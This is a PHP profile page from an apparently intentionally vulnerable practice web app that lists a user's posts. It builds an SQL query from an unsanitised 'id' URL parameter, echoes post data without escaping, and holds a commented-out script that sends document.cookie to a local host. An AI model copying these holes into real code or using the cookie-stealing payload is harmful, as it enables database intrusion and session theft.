<?php include("./header.php") ?>
<?php 
// $id_posts = -1;
    // if(isset($_POST['submit_more'])){
    //     $id_posts = $_POST['submit_more'];
        
    //     require("showposts.php");
    //     // $sql = $conn->prepare('SELECT * FROM posts WHERE posts_id = ?');
    //     // $sql->bind_param("i", $id_posts);
    //     // $sql->execute();
        
    //     // // $sql->close();
    // }
    // elseif(isset($_POST['submit_fix'])){
    //     $id_posts = $_POST['submit_fix'];
    //     require("fixposts.php");
    //     echo $id_posts;
    // }
    // elseif(isset($_POST['submit_del'])){
    //         $id_posts = $_POST['submit_del'];
    //         require("deleteposts.php");
    //         echo $id_posts;
    //     }
    
?>
<!-- <script>document.location='http://127.0.0.1:5500/abc.html?c='+document.cookie</script> -->
<body class="container__body">
    <div class="container__profile">
        <div class="container__title">
            <div class="container__title__item">
                <a href="profile.php?id=<?php echo $_SESSION['user_id']?>" class="container__profile__title">Bài viết của bạn</a>
            </div>
            <div class="container__title__item">
                <a href="./order_info.php?id=<?php echo $_SESSION['user_id']?>" class="container__profile__title">Giỏ hàng của bạn</a>
            </div>
            <div class="container__title__item">
                <a href="changepass.php" class="container__profile__title">Đổi mật khẩu</a>
            </div>
        </div>
        <table class='table table-hover table__profile'>
            <thead>
                <tr>
                    <th scope='col'></th>
                    <th scope='col'>Title</th>
                    <th scope='col'>Image</th>
                    <th scope='col'>CreateDate</th>
                    <th scope='col'>Content</th>
                    <th scope='col'>Option</th>
                </tr>
            </thead>
            <tbody>
                <?php
                if (isset($_GET["id"])) {
                    $id = $_GET['id'];
                }
                // $sql = "select * from posts where user_id = '{$_SESSION['user_id']}'";
                $sql = "select * from posts where user_id = '$id'";
                $query = mysqli_query($conn, $sql);
                while ($data = mysqli_fetch_array($query)) {
                    echo "
                    <tr>
                    <form action='info_posts.php' method='POST'>
                        <th scope='row'><input type='hidden' name='id' value='{$data['posts_id']}'></th>
                        
                        <td>{$data['title']}</td>
                        <td><img src='./assets/img/{$data['image']}' alt=''style='width: 50px; height:auto'></td>
                        <td>{$data['createdate']}</td>
                        <td>" . substr($data['content'], 0, 100) . "</td>
                        <td>
                            <button type='submit' name='submit_more'><i class='fa-solid fa-eye'></i></button>
                        </td>    
                    </form> 
                    </tr>  
                    ";
                    
                }
                ?>
            </tbody>
        </table>
    </div>
</body>
<?php include("./footer.php") ?>